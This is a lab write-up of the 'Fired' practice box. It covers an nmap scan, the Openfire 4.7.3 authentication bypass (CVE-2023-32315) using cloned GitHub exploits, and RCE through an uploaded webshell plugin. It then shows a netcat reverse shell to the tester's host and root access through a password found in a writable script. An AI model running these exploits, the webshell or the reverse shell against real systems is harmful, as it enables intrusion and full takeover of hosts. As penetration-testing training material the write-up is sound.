---
icon: ubuntu
---

# Fired - Intermediate

## <mark style="color:blue;">Gaining Access</mark>

Nmap scan:

```
#Nmap TCP
nmap -A -T4 -p- -Pn 192.168.118.96 -oN scans/nmap-tcpall
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-24 16:34 EDT
Nmap scan report for 192.168.118.96
Host is up (0.029s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE                VERSION
22/tcp   open  ssh                    OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 51:56:a7:34:16:8e:3d:47:17:c8:96:d5:e6:94:46:46 (RSA)
|   256 fe:76:e3:4c:2b:f6:f5:21:a2:4d:9f:59:52:39:b9:16 (ECDSA)
|_  256 2c:dd:62:7d:d6:1c:f4:fd:a1:e4:c8:aa:11:ae:d6:1f (ED25519)
9090/tcp open  hadoop-datanode        Apache Hadoop
| hadoop-datanode-info: 
|_  Logs: jive-ibtn jive-btn-gradient
| hadoop-tasktracker-info: 
|_  Logs: jive-ibtn jive-btn-gradient
|_http-title: Site doesn't have a title (text/html).
9091/tcp open  ssl/hadoop-tasktracker Apache Hadoop
|_http-title: Site doesn't have a title (text/html).
| hadoop-datanode-info: 
|_  Logs: jive-ibtn jive-btn-gradient
| ssl-cert: Subject: commonName=localhost
| Subject Alternative Name: DNS:localhost, DNS:*.localhost
| Not valid before: 2024-06-28T07:02:39
|_Not valid after:  2029-06-27T07:02:39
|_ssl-date: TLS randomness does not represent time
| hadoop-tasktracker-info: 
|_  Logs: jive-ibtn jive-btn-gradient
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running (JUST GUESSING): Linux 4.X|5.X|2.6.X|3.X (97%), MikroTik RouterOS 7.X (97%)
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3 cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:6.0
Aggressive OS guesses: Linux 4.15 - 5.19 (97%), Linux 5.0 - 5.14 (97%), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3) (97%), Linux 2.6.32 - 3.13 (91%), Linux 3.10 - 4.11 (91%), Linux 3.2 - 4.14 (91%), Linux 3.4 - 3.10 (91%), Linux 4.15 (91%), Linux 2.6.32 - 3.10 (91%), Linux 4.19 - 5.15 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT      ADDRESS
1   29.41 ms 192.168.45.1
2   29.40 ms 192.168.45.254
3   30.74 ms 192.168.251.1
4   30.91 ms 192.168.118.96
```

### <mark style="color:$primary;">HTTP Port 9090 TCP</mark>

<figure><img src="../../.gitbook/assets/image (1390).png" alt=""><figcaption></figcaption></figure>

upon visiting the site we are meet with a login form and a version for openfire

### <mark style="color:$primary;">OpenFire 4.7.3 Authentication Bypass</mark>

Google delivers and we find an exploit on [**Github**](https://github.com/K3ysTr0K3R/CVE-2023-32315-EXPLOIT)

```
git clone https://github.com/K3ysTr0K3R/CVE-2023-32315-EXPLOIT.git
```

```
python3 CVE-2023-32315.py -u http://192.168.118.96:9090
```

<figure><img src="../../.gitbook/assets/image (1391).png" alt=""><figcaption></figcaption></figure>

We can use this to login

<figure><img src="../../.gitbook/assets/image (1392).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1393).png" alt=""><figcaption></figcaption></figure>

We can see the new created user by the exploit

I found another exploit on Github that also does the Authentication Bypass and also explains how to get RCE [**here**](https://github.com/miko550/CVE-2023-32315)

```
git clone https://github.com/miko550/CVE-2023-32315.git
```

<figure><img src="../../.gitbook/assets/image (1394).png" alt=""><figcaption></figcaption></figure>

I am going to skip steps 1 and 2 since we already did it earlier

### <mark style="color:$primary;">OpenFire 4.7.3 RCE</mark>

Let's go to the plugin tab and upload the jar file that comes with the repo

<figure><img src="../../.gitbook/assets/image (1395).png" alt=""><figcaption></figcaption></figure>

We see the management tool added. Now for step 4 goto tab server > server settings > Management tool <mark style="color:$warning;">**The Service is very slow so you have to be patient**</mark>

If its taking to long you can go straight to the url

```
http://192.168.118.96:9090/plugins/openfire-management-tool-plugin/cmd.jsp?action=command
```

Final Step access webshell with password "123"

<figure><img src="../../.gitbook/assets/image (1396).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1397).png" alt=""><figcaption></figcaption></figure>

Nice nc is on the machine. Let's get a reverse shell, make sure you have a listener readby before entering the below command

```
busybox nc 192.168.45.158 9090 -e /bin/bash
```

<figure><img src="../../.gitbook/assets/image (1398).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1399).png" alt=""><figcaption></figcaption></figure>

## <mark style="color:blue;">Privilege Escalation</mark>

### <mark style="color:$primary;">Linpeas</mark>

<figure><img src="../../.gitbook/assets/image (1400).png" alt=""><figcaption></figcaption></figure>

Interesting File location and its writable let's check it out

<figure><img src="../../.gitbook/assets/image (1401).png" alt=""><figcaption></figcaption></figure>

We see a scripts file let's check it out

<figure><img src="../../.gitbook/assets/image (1404).png" alt=""><figcaption></figcaption></figure>

There is a password here and for root let's see if we can use it to switch user to root

<figure><img src="../../.gitbook/assets/image (1406).png" alt=""><figcaption></figcaption></figure>

We can also ssh with it

```
ssh root@192.168.118.96
```

<figure><img src="../../.gitbook/assets/image (1405).png" alt=""><figcaption></figcaption></figure>
